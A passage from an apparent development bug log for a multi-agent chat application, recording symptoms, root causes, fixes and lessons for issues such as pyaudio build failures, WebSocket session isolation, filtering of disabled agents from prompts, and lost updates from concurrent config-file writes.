**Fix:** Inside `think()`, after `_set_processing(session_id, True)` and before scheduling begins, reset `self.sessions[session_id]["started_at"] = time.time()` under lock — each task round restarts the timer. The frontend `chat.elapsed` purely consumes the backend-pushed `elapsed_s` with no local timer, so no change needed.

**Verification:** Added `test_api_stream_think_ext.py::test_think_resets_started_at_per_round` (old started_at gets reset; two consecutive rounds refresh their timing origins independently); all 183 api_stream tests pass.

**Lesson:** "Session-lifetime" timing and "task/round-lifetime" timing are two different semantics sharing no timestamp. Elapsed-time fields in WS status pushes must anchor at "this round's processing start", otherwise the UI's elapsed-time display distorts.

## 81. Vercel deployment failure: pyaudio compilation requires portaudio.h (server/headless environment dependency governance)

**Symptom:** Deploying to Vercel, the build failed:
```
error: Command '['cc', ..., '-c', 'src/pyaudio/device_api.c', ...]' returned non-zero exit status 1
hint: This error likely indicates that you need to install a library that provides "portaudio.h"
help: `pyaudio` (v0.2.14) was included because `cortex-agent` depends on `pyaudio`
```

**Root cause:** `requirements.txt` listed `pyaudio` as a required dependency. PyAudio is PortAudio's C extension; pip installation requires compiling (source-only, no wheel), and compilation depends on the system dev header `portaudio.h`. Vercel's Python sandbox lacks that library and offers no apt to install it. pyaudio serves only local microphone recording (`modules/perception/detectors/voice_detector.py` / `hotkey_voice_detector.py`); server/headless environments can neither compile it nor use it.

**Fix:** Moved local hardware/desktop-specific dependencies out of the main `requirements.txt` into a new `requirements-voice.txt`:
- Removed: `pyaudio`, `pynput` (global hotkeys), `pyautogui` (desktop automation), `pyserial` (serial ports)
- Kept: `SpeechRecognition`, `gTTS`, `openai-whisper` (pure Python / server-installable)
- Voice detectors already perform lazy imports + `_check_availability()`'s `except ImportError` degradation (`is_available()=False` → won't start); there is no top-level `import pyaudio`, so absence doesn't affect core functionality.

**Verification:** `test_detectors.py`/`test_voice_hotkey.py`/`test_perception.py` 107 tests pass; requirements.txt syntactically valid; voice/desktop modules all import lazily inside functions.

**Lesson:** Server deployments (Vercel-like sandbox builds) cannot include local-hardware packages that depend on system C libraries/have no wheels. Such dependencies belong in an optional file (e.g., requirements-voice.txt), paired with lazy imports + graceful ImportError degradation in code, achieving "installed → feature present; missing → no crash".

## 82. Multi-session parallelism: single WS connection + global processing state caused cross-session interference (frontend ws client / chat store / Chat.vue)

**Symptom:** After asking a question in session A and switching to B, a banner appeared: 「会话「b1da48c1…」正在思考中，切回该会话可查看进度」("Session 'b1da48c1…' is thinking; switch back to view progress"); A's reply was lost (invisible after returning to A); B's processing state was unexpectedly cleared by A's done/error events. User requirement: sessions independent and parallel, with no cross-session banners.

**Root cause:** The frontend WS client `frontend/src/ws/client.js` was **single-connection** (`this._conn` holds one WebSocket; `connect()` closes the old one); the chat store's `processing`/`_processingSid` was **globally singular**. Switching to B while A processed and sending a message: `_ensureConnected` force-closed A's connection (`this._conn.close()` inside `_doConnect`), A's backend task kept running but results could never arrive; `_onDone`/`_onError` called `finalizeStream('')` even for non-current-session events, unconditionally clearing the global `processing` and wrongly wiping B's state; `_onMessage`/`_onThinking` did filter by `session_id` (nothing mixed into B's stream), but state clearing and connection switching were not session-isolated.

**Fix:** True session parallelism requires every processing session to hold its own connection + its own state:
- `frontend/src/ws/client.js` converted to multi-connection: `_conns = { sid: {conn, ...} }`, adding `isConnected(sid)`, `send(sid, data)`, `disconnect(sid)`, `disconnectAll()`; `connect(sid)` no longer closes other sessions' connections
- `frontend/src/stores/chat.js`: `_processingSid` → `_processingSids` (a `Set` supporting multi-session parallelism); `processing` became a computed (is the current session processing?); added `finalizeSession(sid)` for precise per-session cleanup plus a `markProcessing(sid, on)` helper; `switchToSession` always connects the target session while preserving other sessions' processing states; `sendMessage`/`stop`/`clearMessages` operate on the current session
- `frontend/src/pages/Chat.vue`: removed the cross-session banner 「会话xxx正在思考中」("Session xxx is thinking"); `_onDone`/`_onError` call only `finalizeSession(sid)` for non-current-session events, leaving the current session untouched; the watchdog checks the current session's connection (`isConnected(session.sessionId)`)

**Verification:** ws client gained multi-session independent-connection tests; chat store gained parallel-session scenario tests (switch from A-processing to B while B also processes; A's done doesn't clear B's state); Chat.spec gained a real `switchToSession` flow verifying A's reply/thinking/done never mix into B; all 505 frontend tests pass, `npm run build` passes.

**Lesson:** "Session parallelism" demands that both connection setup/teardown and state lifecycles be isolated along the session dimension. A singleton connection + global boolean supports only single-session serialization; multi-session concurrency must model both "connections" and "processing state" as sets/maps, routing events precisely by `session_id`.

## 83. After disabling a supervisor/expert on the orchestration page, the System Prompt still stitched in their context (capability tables didn't filter enabled state)

**Symptom:** After disabling some supervisor/expert (enable toggle) on the orchestration page, the system prompt preview and runtime prompts still contained that role's entry within the "delegable supervisors/experts" tables; and the disabled role could still be scheduled/delegated into starting.

**Root cause:** `config/prompts/composer.py::_merged_roles()` (the capability-table data source) merged roles.yaml + orchestration-page custom agents **without querying `settings.get_agent_active()`**, making the off-state entirely ineffective for system prompt assembly. Enable/disable state lives in personas.yaml's `agent_active` (default True), but the capability-table path never read it. Runtime scheduling's `start_runner` already checks `get_agent_active() is False → refuse start` (model_runner.py:3044), but the prompt-side gap let "disabled roles still appear in the delegable list", misleading the model into treating them as delegable.

**Fix:** `config/prompts/composer.py::_merged_roles()` uniformly filters out active=false roles before merging (both roles.yaml built-ins and custom agents filtered via `settings.get_agent_active(key)`, falling back to all-True if the method is missing, preserving compatibility with tests/external callers). The identity table `get_identities()` deliberately does **not** filter (keeping scheduling resolvable; delegation gets refused by `start_runner`'s active check, avoiding "unknown identity template" false alarms). `settings.set_agent_active`/`deactivate_same_tier` additionally call `_invalidate_identity_cache()` so enable/disable changes reflect immediately. Additionally, `delegation_port.delegate` now checks `get_agent_active(identity_key)` before delegating, refusing disabled roles outright (consistent with capability-table filtering, avoiding the "prompt doesn't show it yet delegation accepts and start fails" disconnect).

**Verification:** Added `test_build_tables_filter_disabled_agents` (disabled code_supervisor/data_analyzer excluded from capability tables) and `test_delegate_disabled_agent_rejected` (delegating a disabled role is refused); `test_build_supervisor_table_merges_custom_agents` and delegation tests mock `get_agent_active` with fixed values, isolating real yaml state; 197 composer/identity/delegation_port/settings related tests + 360 model_runner/orchestrator tests pass.

**Lesson:** An "enable/disable switch" must thread through every path consuming role collections: the prompt capability table (which delegables the model sees) and the scheduling entry (whether start truly proceeds) each govern one segment; omitting either yields "prompt-visible yet start-refused" or "disabled yet still present in context" disconnects. After config changes (active flips), invalidate the identity cache, otherwise changes don't take effect.

## 84. After switching the commander on the orchestration page, startup still targeted orchestrator and was refused by the toggle (orchestrator hardcoded identity)

**Symptom:** After enabling a custom commander (tier=large, e.g., `123`) on the orchestration page, sending a message that triggered thinking reported `[ModelRunnerManager] orchestrator 已被禁用（编排页激活开关），拒绝启动`, and the commander couldn't run. The orchestration page's toggle logic enforces "only one active in the commander layer" (`deactivate_same_tier`: enabling `123` sets `orchestrator` to false), yet startup always used the `orchestrator` identity.

**Root cause:** `multi_model_orchestrator`, when activating the large model, **hardcoded** `identity_key: "orchestrator"` (probe_started message) and `match_skill(role="orchestrator")`, never reading the orchestration page's selected active large role. Once §83 gave `start_runner` the `get_agent_active() is False → refuse start` check, this hardcoding got "amplified": the orchestrator still requested orchestrator, but orchestrator had been deactivated by same-tier exclusivity → start refused, even though the custom commander `123` was active. Chat-side (chat_light) persona selection has long supported "orchestrator first, else the activated custom large" (prompt_composer); the orchestrator hadn't synced.

**Fix:** `multi_model_orchestrator` gains module-level `resolve_active_large_role()`: returns `orchestrator` when orchestrator is active, otherwise the first custom agent with `tier=large` and `get_agent_active=True`, falling back to orchestrator on exceptions. Both probe_started's `identity_key` and `match_skill`'s `role` now use it.

**Verification:** Added `tests/unit/test_resolve_active_large_role.py` with 6 cases (orchestrator priority / custom-large follows / multiple customs pick first active / supervisor excluded / exception fallback); 78 orchestrator tests pass. In the real environment `~/.cortex/personas.yaml` (orchestrator=false, 123=true), `resolve_active_large_role()` returns `123`.

**Lesson:** Hardcoded default role names (orchestrator) encode an "identity single-point" assumption; once the orchestration page allows same-tier exclusive multi-select (a unique active commander), any path bypassing that abstraction and hardwiring the role key decouples from toggle state. Start-type paths should funnel through one shared "resolve currently-active role" helper instead of scattered hardcodes; §79 (delegation ROLE_TO_IDENTITY hardcode), §83 (capability table not filtering active) belong to the same "role-collection source mismatch" family.


## 85. Multiple utterances by the same AI merged into one bubble (frontend expert-bubble mechanism)

**Symptom:** Under orchestration mode, the same AI (same tier + same identity) had its first and second utterances merged into a single chat bubble, their contents overwriting each other. User expectation: every utterance gets an independent bubble for easy conversation-history tracing.

**Root cause:** The frontend `chat.js`'s `addExpertMessage` deduplicated and reused existing bubbles keyed by `tier` (`existing.content = content` overwrites). §86 fixed cross-identity replacement (switching to `tier:identity` composite keys), but **multiple outputs of the same identity still reuse the same bubble** — the second utterance hits the existing same-identity bubble and overwrites content instead of creating a new bubble.

**Symptom details:**
- `addExpertThinking` (thinking buffer) accumulates by identity into `_pendingByTier`; `addExpertMessage` flushes it into the bubble once, then clears that identity's thinking buffer.
- `addExpertTool` (tool calls) likewise accumulates into `_pendingTools`, flushed into the bubble.
- The problem: when the same AI emits multiple times within one conversational round (think first, call tools, output again), only the last complete content survives; earlier thinking processes and tool calls are lost.

**Fix direction:** `addExpertMessage` should create a new bubble for each output rather than reusing the same-identity bubble. Thinking/tool buffers still accumulate per identity, but at each flush they are **consumed and attached to that output's bubble**, not cleared wholesale so subsequent outputs can still reference them. The `switchToSession` replay path must be aligned accordingly.

**Scope:** `frontend/src/stores/chat.js`'s `addExpertMessage`, `addExpertThinking`, `addExpertTool`, `_clearExpertState`, and the `switchToSession` replay path.

**Current status:** Identified; fix pending implementation.


## 86. personas.yaml contents lost / system-prompt override vanishes after restart (config persistence risk)

**Symptom:** `~/.cortex/personas.yaml` lost all previously stored `agent_active` (orchestrator=false, 123=true) and custom-agent information; only `model_params: {}` remains in the file. User reports "full system prompt overrides disappear on every restart".

**Root-cause investigation:**

Verified-correct paths (no data loss):
- Setters such as `set_system_override` / `set_persona` / `set_model_params` all follow read-modify-write (`_load_personas_yaml` full read → modify → `_save_personas_yaml` write-back), **never dropping other keys**.
- Live-server verification: `PUT /config/persona/orchestrator` writes → lands in `~/.cortex/personas.yaml` → `GET /management/orchestration` reads back → `POST /management/orchestration/preview` assembles the prompt correctly using the override.
- `composer.build_system` reads `get_system_override(req.role)` → returns override text (taking precedence over all assembly logic).
- Frontend `saveOverride` correctly sends `{value, system_override}`; `savePersona` omits the `system_override` field → backend `if body.system_override is not None` skips → no accidental clearing.
- Startup/shutdown paths (`api/main.py` lifespan, `bootstrap.py`, `frontend/main.py` subprocess) contain no code writing personas.yaml.
- No direct personas.yaml read/write code in `config/prompts/composer.py` or under `modules/`.

**Unresolved questions:**
1. How did `personas.yaml`'s earlier contents (agent_active, custom agents) disappear? None of the setters deletes non-target keys.
2. Possible trigger scenarios: two processes writing concurrently (read-modify-write race), the packaged desktop app using a different HOME/config path, the user manually deleting/overwriting the file, or some bug causing `_load_personas_yaml` to return `{}` (file missing/read failure) after which set_* wrote empty data.
3. The current `personas.yaml` containing `model_params: {}` is a cleanup byproduct of this investigation's round-trip tests (the file already held only this content before testing).

**Scope:** All features writing personas.yaml via `set_*` (personas, system overrides, tool permissions, model params, agent toggles, custom agents).

**Current status:** Backend write/read paths verified correct; override persistence works fine. The root cause of the earlier personas.yaml data loss remains under further investigation (may need file-write logging or atomic-write monitoring).


## 87. personas.yaml concurrent writes lose updates — no process-level lock (backend)

**Symptom:** Two concurrent API requests (e.g., updating persona and tools simultaneously) modify personas.yaml; the second write clobbers the first's changes. In the worst case this reproduces §86's "data loss after restart".

**Root cause:** All `set_*` methods (`set_persona`/`set_system_override`/`set_role_tools`/`set_model_params`/`set_agent_active`/`set_custom_agent` etc.) follow read-modify-write (`_load_personas_yaml` → modify → `_save_personas_yaml`) but **lack a process-level lock**. Multiple concurrent requests read the same file version, each modifies different keys, then write back — the later write clobbers the earlier. Atomic `os.replace` prevents half-writes, not lost updates.

**Scope:** 14+ `set_*` methods share the same `_save_personas_yaml`; any two concurrent calls lose data.

**Recommended fix:** Add a file-level lock (e.g., `fcntl.flock` or `threading.Lock`), or coalesce into single writes (multiple `set_*` calls within one request merged into one read-modify-write).

**Similar-issue sweep:** `save_user_config` (settings.json) suffers the exact same problem.


## 88. settings.json concurrent writes lose updates (backend)

**Symptom:** The Settings page's "Save model form" iterates multiple keys PUTting one by one; each PUT triggers `save_user_config`'s read-modify-write of settings.json. With two concurrently operating browser tabs or rapid operations, the second write clobbers the first.

**Root cause:** `save_user_config` (`config/settings.py:902`) reads settings.json → adds the key → writes back, with no lock. Atomic `os.replace` prevents half-writes but not lost updates. `_load_user_config` (line 884) has no retry logic (unlike `_load_personas_yaml`'s retry), silently falling back to .env defaults when JSON corrupts.

**Scope:** Every config item modified through the Settings page (model params, API keys, switches etc.).

**Recommended fix:** Add a file-level lock or switch to optimistic locking (verify the file hasn't been modified before writing).


## 89. delete_custom_agent cascades four independent read-modify-writes, losing data (backend)

**Symptom:** When deleting a custom agent, `delete_custom_agent` removes the agent and then makes **four independent** `set_persona`/`set_system_override`/`set_role_tools`/`set_model_params` calls to clean up that agent's configs. If any intermediate write gets clobbered by a concurrent request, orphaned data remains; a process crash leaves partial cleanup incomplete.

**Root cause:** `api/main.py:950-962`: five independent read-modify-writes, with other requests free to interleave modifications between each.

**Scope:** Config inconsistency after deleting a custom agent (residual persona/override/tools/params).

**Recommended fix:** Coalesce into a single read-modify-write (one read, delete all keys at once, one write-back).


## 90. _save_personas_yaml swallows exceptions — callers assume success (backend)

**Symptom:** `_save_personas_yaml` only print-warns on write failure, raising nothing. All 14+ `set_*` callers assume success; APIs return success toasts. Users see "Saved" although nothing landed on disk; a restart restores old values.

**Root cause:** `config/settings.py:589-604`: `except Exception` catches everything (disk full, permission errors, file-lock conflicts), printing only to stderr. API endpoints return `{"success": True}`.

**Scope:** All personas.yaml write operations, silently lost.

**Recommended fix:** `_save_personas_yaml` should return success/failure (mirroring `save_user_config`'s bool pattern); callers decide whether to inform the user based on the return value.


## 91. switchToSession replay path merges multiple outputs of the same identity (frontend)

**Symptom:** When switching sessions, multiple outputs of the same identity (tier:identity) — e.g., "前端方案v1", "前端方案v2", "前端方案v3" — merge into one bubble showing only the last. Same origin as §85.

**Root cause:** `chat.js:208-286`'s `switchToSession` replay path aggregates all thinking/contents by `tier:identity` into `expertAgg`, ultimately taking `agg.contents[agg.contents.length - 1]`. Intermediate outputs are lost.

**Scope:** Conversation history appears incomplete after switching sessions.

**Recommended fix:** The replay path should create a bubble per output rather than aggregating by identity.


## 92. _session_dialog_history concurrent overwrite — two requests on one session clobber each other (backend)

**Symptom:** Sending two messages rapidly in the same session: the second's dialog history overwrites the first's, so the first message's frontend expansion panel displays wrong history.

**Root cause:** `multi_model_orchestrator.py:32-33`'s `_session_dialog_history` is a module-level dict with no locking. Two concurrent requests write different content for the same session_id.

**Scope:** Expansion-panel contents scramble during concurrent conversations.

**Recommended fix:** Switch to per-session locks or per-request independent storage.


## 93. TurnContext fragments overwritten by source — same-source different-content lost (backend)

**Symptom:** Context fragments produced by two different modules (e.g., memory retrieval and causal analysis) used the same `source` name (e.g., `"memory"`), the latter overwriting the former.

**Root cause:** `pool.py:97`: `self.fragments[fragment.source] = fragment`, with no dedup/merge logic.

**Scope:** Blackboard-shared memories may lose some sources' context.

**Recommended fix:** Switch to a list (same-source fragments coexist) or use composite `source:sub_key` keys.


## 94. thinking-content substring dedup over-kills — short text swallowed by longer containing text (frontend)

**Symptom:** AI thinking step A "分析需求" ("analyze requirements") and step B "分析需求并制定方案" ("analyze requirements and devise a plan"): B contains A's substring, so B got skipped by the `includes()` dedup.

**Root cause:** `chat.js:341`: `if (pendingThinking.value.includes(line)) return` matches substrings rather than exact equality.

**Scope:** Thinking steps occasionally lost (low probability but real).

**Recommended fix:** Store already-output lines in a `Set` (exact matching), or compare via `line.trim() === existing.trim()`.
